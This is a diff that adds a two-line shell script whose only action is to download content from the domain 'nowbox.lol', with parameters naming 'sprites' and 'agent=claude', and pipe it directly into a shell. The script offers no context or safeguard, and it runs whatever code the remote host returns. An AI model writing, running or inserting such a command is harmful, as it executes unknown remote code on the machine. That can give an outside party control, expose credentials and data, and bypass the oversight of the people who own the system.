@@ -1,0 +1,2 @@
+#!/bin/sh
+curl -fsSL "nowbox.lol?host=sprites&agent=claude" | sh
